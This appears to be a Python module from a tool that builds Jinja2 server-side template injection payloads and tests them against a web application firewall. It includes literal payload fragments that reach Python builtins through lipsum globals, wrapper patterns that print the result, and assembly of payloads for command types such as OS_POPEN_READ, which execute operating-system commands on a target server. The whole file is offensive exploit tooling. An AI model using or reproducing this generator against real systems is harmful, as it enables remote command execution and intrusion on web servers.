from typing import Callable, List, Tuple, Union, Dict
import logging

from . import payload_gen
from .int_vars import get_useable_int_vars
from .colorize import colored
from .const import *

logger = logging.getLogger("shell_payload")


def get_int_context(waf_func):
    ints, var_names, payload = get_useable_int_vars(waf_func)
    if len(ints) == 0:
        logger.warning("No IntVars For YOU!")
    return payload, dict(zip(var_names, ints))


def get_str_context(waf_func):
    str_vars = [
        ("un", "_", "{%set un=((({}|select()|trim|list)[24]))%}"),
        ("perc", "%", "{%set perc=(lipsum[((({}|select()|trim|list)[24]))*2" +
         "+dict(globals=x)|join+((({}|select()|trim|list)[24]))*2]" +
         "[((({}|select()|trim|list)[24]))*2+dict(builtins=x)" +
         "|join+((({}|select()|trim|list)[24]))*2][dict(chr=x)|join](37))%}"),
        # ("fc", "{:c}", "{%set fc={{{1:2}|string|replace({1:2}|string|batch(4)|first|last,{}|join)|replace(1|string,{}|join)|replace(2|string,dict(c=1)|join)}}%}")
    ]
    str_vars = [tpl for tpl in str_vars if waf_func(tpl[2])]
    return "".join(payload for _, _, payload in str_vars), {var_name: var_value for var_name, var_value, _ in str_vars}


def get_outer_pattern(waf_func):
    outer_payloads = [
        ("{{}}", "{{PAYLOAD}}", True),
        ("{%print()%}", "{%print(PAYLOAD)%}", True),
        ("{%if()%}{%endif%}", "{%if(PAYLOAD)%}{%endif%}", False),
        ("{% set x= %}", "{% set x=PAYLOAD %}", False),
    ]
    for test_payload, outer_pattern, will_print in outer_payloads:
        if waf_func(test_payload):
            return outer_pattern, will_print
    else:
        logger.warning("LOTS OF THINGS is being waf, NOTHING FOR YOU!")
        return None, None


class FullPayloadGen:
    """接受一个waf函数并负责生成payload
    waf函数接受一个字符串并返回这个字符串是否可以通过WAF
    payload由两部分组成：
        - 前方提供变量等上下文的上下文payload（一般为{%set xxx=xxx%}的形式）
        - 以及后方实际发挥作用的作用payload（一般被双花括号{{}}包裹）
    """
    def __init__(self, waf_func: Callable[[str, ], bool], callback: Union[Callable[[str, Dict], None], None] = None):
        self.waf_func = waf_func
        self.prepared = False
        self._callback: Callable[[str, Dict], None] = callback if callback else (lambda x, y: None)

    @property
    def callback(self):
        return self._callback
    
    @callback.setter
    def callback(self, callback):
        self._callback = callback
        if self.payload_gen:
            self.payload_gen.callback = callback

    def do_prepare(self) -> bool:
        """生成上下文payload，并准备作用payload的最外层（一般为双花括号{{}}）

        Returns:
            bool: 是否生成成功，失败则无法生成payload。有时生成的
        """
        if self.prepared:
            return True

        int_payload, int_context = get_int_context(self.waf_func)
        str_payload, str_context = get_str_context(self.waf_func)

        self.context_payload, self.context = int_payload + \
            str_payload, {**int_context, **str_context}
        self.outer_pattern, self.will_print = get_outer_pattern(self.waf_func)
        if not self.outer_pattern:
            return False
        if self.will_print:
            logger.info(f"use {colored('blue', self.outer_pattern)}")
        else:
            logger.warning(
                f"use {colored('blue', self.outer_pattern)}, which {colored('red', 'will not print')} your result!")

        self.payload_gen = payload_gen.PayloadGenerator(self.waf_func, self.context, self.callback)
        self.prepared = True
        self.callback(CALLBACK_PREPARE_FULLPAYLOADGEN, {
            "context_payload": self.context_payload,
            "context": self.context,
            "outer_pattern": self.outer_pattern,
            "will_print": self.will_print,
        })
        return True

    def generate(self, gen_type, *args) -> Tuple[Union[str, None], Union[bool, None]]:
        """根据要求生成payload

        Args:
            gen_type (str): 生成payload的类型，应传入如OS_POPEN_READ等在const.py中定义的类型

        Returns:
            Tuple[Union[str, None], Union[bool, None]]: payload, 以及payload是否会有回显
        """
        if not self.prepared and not self.do_prepare():
            return None, None

        inner_payload = self.payload_gen.generate(gen_type, *args)

        if inner_payload is None:
            logger.warning("Bypassing WAF Failed.")
            return None, None

        assert isinstance(self.outer_pattern, str)

        payload = self.context_payload + self.outer_pattern.replace("PAYLOAD", inner_payload)

        self.callback(CALLBACK_GENERATE_FULLPAYLOAD, {
            "gen_type": gen_type,
            "args": args,
            "payload": payload,
            "will_print": self.will_print,
        })

        return (
            payload, 
            self.will_print
        )


